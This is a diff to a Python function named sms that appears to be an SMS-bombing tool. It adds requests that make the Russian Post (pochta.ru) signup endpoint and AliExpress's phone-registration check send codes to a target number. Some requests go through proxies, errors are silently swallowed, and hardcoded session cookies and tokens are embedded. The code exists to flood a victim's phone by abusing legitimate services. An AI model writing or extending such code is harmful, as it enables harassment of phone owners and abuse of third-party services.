@@ -129,6 +129,33 @@ def sms(prx, number, tm, code):
 					pass
 
 				try:
+					header = {
+						"Accept": "*/*",
+						"Accept-Encoding": "gzip, deflate, br",
+						"Accept-Language": "en-US,en;q=0.9",
+						"Connection": "keep-alive",
+						"Content-Length": "23",
+						"Content-Type": "application/json; charset=utf-8",
+						"Cookie": "ANALYTICS_UUID=0f11c8f8-2a1d-4aa8-ac9e-14375762326f; POCHTA_LANGUAGE=ru_RU; cdmdtr=eyJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MDIwMTIyNjcsInN1YiI6IkZpbmdlclByaW50VG9rZW4iLCJ0b2tlbklkIjoiNzY4MzA4OWEtNTNiMi00MDBiLWIwOTYtNjUzZTNlZDBiNDlhIiwiY3JlYXRpb25EYXRlIjoiMTYzOTkxMjI2NzE3OSJ9.hzSMPyIaRhHrN8-IXyp1jLGb6RsJVorUtLLd6cuHhpU; jact=e407ecc92b3d9d89026c19c44aa64f1e2dfbf9c6; act=29252fc6-a8d4-4864-953d-67d555d84bd9; sct=9a4a1bdc-88e9-44f6-b284-8c00213f9d75",
+						"dnt": "1",
+						"Host": "passport.pochta.ru",
+						"Origin": "https://passport.pochta.ru",
+						"Referer": "https://passport.pochta.ru/pc/ext/v2.0/form/signUp?callbackurl=https%3A%2F%2Fpassport.pochta.ru%2Foauth2%2Fauthorize%3Fresponse_type%3Dcode%26scope%3Dopenid%2Bemail%26partyType%3DPHYSICAL%26registration%3Dfalse%26client_id%3Dh9ING4sB_FjPBzNgtuUCeWrSQA8a%26redirect_uri%3Dhttps%253A%252F%252Fwww.pochta.ru%252Fc%252Flogin%252Fpost_id_callback%26group%3Dportal%26lang%3Dru&display=page&dm=l",
+						"sec-ch-ua": '"Chromium";v="96", "Opera GX";v="82", ";Not A Brand";v="99"',
+						"sec-ch-ua-mobile": "?0",
+						"sec-ch-ua-platform": "Windows",
+						"Sec-Fetch-Dest": "empty",
+						"Sec-Fetch-Mode": "cors",
+						"Sec-Fetch-Site": "same-origin",
+						"sec-gpc": "1",
+						"User-Agent": 'Moz"illa/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)'
+						}
+					payload = {"phone":number,"resend":False,"display":"page","dm":"l"}
+					requests.post("https://passport.pochta.ru/pc/ext/v2.0/signUp/phone/request", headers=header, json=payload, proxies = proxies)
+				except:
+					pass
+
+				try:
 					payload = {
 						"fio":"",
 						"password":"2342uirejhwfr",
@@ -501,6 +528,38 @@ def sms(prx, number, tm, code):
 					pass
 
 				try:
+					header = {
+						"Accept": "*/*",
+						"Accept-Encoding": "gzip, deflate, br",
+						"Accept-Language": "en-US,en;q=0.9",
+						"Connection": "keep-alive",
+						"Content-Length": "23",
+						"Content-Type": "application/json; charset=utf-8",
+						"Cookie": "ANALYTICS_UUID=0f11c8f8-2a1d-4aa8-ac9e-14375762326f; POCHTA_LANGUAGE=ru_RU; cdmdtr=eyJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MDIwMTIyNjcsInN1YiI6IkZpbmdlclByaW50VG9rZW4iLCJ0b2tlbklkIjoiNzY4MzA4OWEtNTNiMi00MDBiLWIwOTYtNjUzZTNlZDBiNDlhIiwiY3JlYXRpb25EYXRlIjoiMTYzOTkxMjI2NzE3OSJ9.hzSMPyIaRhHrN8-IXyp1jLGb6RsJVorUtLLd6cuHhpU; jact=e407ecc92b3d9d89026c19c44aa64f1e2dfbf9c6; act=29252fc6-a8d4-4864-953d-67d555d84bd9; sct=9a4a1bdc-88e9-44f6-b284-8c00213f9d75",
+						"dnt": "1",
+						"Host": "passport.pochta.ru",
+						"Origin": "https://passport.pochta.ru",
+						"Referer": "https://passport.pochta.ru/pc/ext/v2.0/form/signUp?callbackurl=https%3A%2F%2Fpassport.pochta.ru%2Foauth2%2Fauthorize%3Fresponse_type%3Dcode%26scope%3Dopenid%2Bemail%26partyType%3DPHYSICAL%26registration%3Dfalse%26client_id%3Dh9ING4sB_FjPBzNgtuUCeWrSQA8a%26redirect_uri%3Dhttps%253A%252F%252Fwww.pochta.ru%252Fc%252Flogin%252Fpost_id_callback%26group%3Dportal%26lang%3Dru&display=page&dm=l",
+						"sec-ch-ua": '"Chromium";v="96", "Opera GX";v="82", ";Not A Brand";v="99"',
+						"sec-ch-ua-mobile": "?0",
+						"sec-ch-ua-platform": "Windows",
+						"Sec-Fetch-Dest": "empty",
+						"Sec-Fetch-Mode": "cors",
+						"Sec-Fetch-Site": "same-origin",
+						"sec-gpc": "1",
+						"User-Agent": 'Moz"illa/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)'
+						}
+					payload = {"phone":number,"resend":False,"display":"page","dm":"l"}
+					requests.post("https://passport.pochta.ru/pc/ext/v2.0/signUp/phone/request", headers=header, json=payload)
+				except:
+					pass
+
+				try:
+					requests.get(f"https://login.aliexpress.ru/join/PreCheckForPhoneRegister.htm?cellPhone=7-{number[1:]}&umidToken=defaultToken4_init_failed+with+failed%40%40https%3A%2F%2Faliexpress.ru%2F%40%401642611333739&ua=%5Bobject+Promise%5D&registerFrom=AE_MAIN_REGISTER&bx-ua=217!EBGGYGznGz4eN2CgjdZGf6a0AmrKrOl2p03jjsrNDiBNgnZ6%2BGOgMemXLpdDex%2B8bcbiv9J1EKDgjsZB6SozsTHfNLcUEZjAFa4u20iIbSfSnsXM%2BcyXfG2fGdi6vO91G2YYGAreoEZ1UwR4wOuBv9MT%2FJNfkb9GZ2Yx8WM5ClG1LwRARbWB1UGh%2FkzFvjWGp2qq8KYBC0GGLw%2F4kVWBpjPyfZxbv0r4EtqqLOGz200a%2Fk0js2gW6HgNl30HqTEz%2BR0XqDTbnJmq0Qqpj6xuSxPNz30cKsOK%2Bq0EiA5EnIDU0JaMT2NweM3qT0FyHQd530qIwOrRqxWfMt8wldlOo1gxVw7h209aAdxK%2Ft13zPPU04upCmFt3i37%2B0pZzela6HsIqikwaD9jR28ppmFEuiFNs0pcHrWf6K0hqVybUFmKwDwejl99ogP2lK7y5Y0J3RatOk5F5cF5Y43URvEUpGGh%2Fk815V%2FlDDuhOEGRqNn564wPFThkrr3szGauSS5Ur9p9GA5DS9ufLYObiSvBGMG3%2FkR0C4WGG2zx8KqB5iqYqHqBODddbxgPeJ8gK385o1dtOEFOJ0FVLx7JZ%2BmBZGMygEs%2FvCX1GTP2c%2BQ2LdPl8TRLOH6wWkdoksCCaq7jB%2FVXpBDUUC3UOK5ShqDAjnSLWcY8S6gKsi5uF60dq53tgLd0x7GqmuwXCGpKpGVQ6II2JT0lsWI2QgmVbUERLbZIWOnWfltLFj%2FM8Sxh8%2FSTH6lbDflM70ldQCJvQN74imTWA1PN4l6cNw5P8msgHpF%2B7WJBNuezdcEt5CdOw0jicbTPjNpwQnkVIrEOxeD9ALTlG%2FV2OzSAGe2CC9QTRpRVUxYBsgYkaRKG2Nxg3eN29DDo%2FLARMubD2%2B4TtlUzA75%2BhDMM7VamEozoEUgHVUVk3yqFlLjViFGpU1yIbv%2BSkCzqwB8Qr97tYmk2AlFV%2BgLAzHZH9ffexVagYRLocsDojL9oBtnxYMPE8xSc4A2dgTiKfQaxv6q3bcxNPlplRp%2FGyvdoeinAxjCg%2Bi1IB6%2BQ3PmWUYbe1cHUKXfsSmksXpstOwjSYwm4vtxIxztG31cmu93BC0Z5ep5a03HbCanIp3mP%2BRMU%2FllzqkG0FTPOslgBucamTHJ14Imj%2FHrtUAMb437nAdmuK85wGWBU3zx6xdAgAXbf30%3D%3D&bx-umidtoken=defaultToken4_init_failed%20with%20failed%40%40https%3A%2F%2Faliexpress.ru%2F%40%401642611336744&_bx-v=2.0.39", proxies = proxies)
+				except:
+					pass
+
+				try:
 					payload = {
 						"phoneNumber": f"+{number}"
 					}
@@ -585,6 +644,11 @@ def sms(prx, number, tm, code):
 				try:
 					payload = {"phone": number}
 					requests.post("https://b-apteka.ru/lk/send_confirm_code", json=payload)
+				except:
+					pass
+
+				try:
+					requests.get(f"https://login.aliexpress.ru/join/PreCheckForPhoneRegister.htm?cellPhone=7-{number[1:]}&umidToken=defaultToken4_init_failed+with+failed%40%40https%3A%2F%2Faliexpress.ru%2F%40%401642611333739&ua=%5Bobject+Promise%5D&registerFrom=AE_MAIN_REGISTER&bx-ua=217!EBGGYGznGz4eN2CgjdZGf6a0AmrKrOl2p03jjsrNDiBNgnZ6%2BGOgMemXLpdDex%2B8bcbiv9J1EKDgjsZB6SozsTHfNLcUEZjAFa4u20iIbSfSnsXM%2BcyXfG2fGdi6vO91G2YYGAreoEZ1UwR4wOuBv9MT%2FJNfkb9GZ2Yx8WM5ClG1LwRARbWB1UGh%2FkzFvjWGp2qq8KYBC0GGLw%2F4kVWBpjPyfZxbv0r4EtqqLOGz200a%2Fk0js2gW6HgNl30HqTEz%2BR0XqDTbnJmq0Qqpj6xuSxPNz30cKsOK%2Bq0EiA5EnIDU0JaMT2NweM3qT0FyHQd530qIwOrRqxWfMt8wldlOo1gxVw7h209aAdxK%2Ft13zPPU04upCmFt3i37%2B0pZzela6HsIqikwaD9jR28ppmFEuiFNs0pcHrWf6K0hqVybUFmKwDwejl99ogP2lK7y5Y0J3RatOk5F5cF5Y43URvEUpGGh%2Fk815V%2FlDDuhOEGRqNn564wPFThkrr3szGauSS5Ur9p9GA5DS9ufLYObiSvBGMG3%2FkR0C4WGG2zx8KqB5iqYqHqBODddbxgPeJ8gK385o1dtOEFOJ0FVLx7JZ%2BmBZGMygEs%2FvCX1GTP2c%2BQ2LdPl8TRLOH6wWkdoksCCaq7jB%2FVXpBDUUC3UOK5ShqDAjnSLWcY8S6gKsi5uF60dq53tgLd0x7GqmuwXCGpKpGVQ6II2JT0lsWI2QgmVbUERLbZIWOnWfltLFj%2FM8Sxh8%2FSTH6lbDflM70ldQCJvQN74imTWA1PN4l6cNw5P8msgHpF%2B7WJBNuezdcEt5CdOw0jicbTPjNpwQnkVIrEOxeD9ALTlG%2FV2OzSAGe2CC9QTRpRVUxYBsgYkaRKG2Nxg3eN29DDo%2FLARMubD2%2B4TtlUzA75%2BhDMM7VamEozoEUgHVUVk3yqFlLjViFGpU1yIbv%2BSkCzqwB8Qr97tYmk2AlFV%2BgLAzHZH9ffexVagYRLocsDojL9oBtnxYMPE8xSc4A2dgTiKfQaxv6q3bcxNPlplRp%2FGyvdoeinAxjCg%2Bi1IB6%2BQ3PmWUYbe1cHUKXfsSmksXpstOwjSYwm4vtxIxztG31cmu93BC0Z5ep5a03HbCanIp3mP%2BRMU%2FllzqkG0FTPOslgBucamTHJ14Imj%2FHrtUAMb437nAdmuK85wGWBU3zx6xdAgAXbf30%3D%3D&bx-umidtoken=defaultToken4_init_failed%20with%20failed%40%40https%3A%2F%2Faliexpress.ru%2F%40%401642611336744&_bx-v=2.0.39")
 				except:
 					pass
 
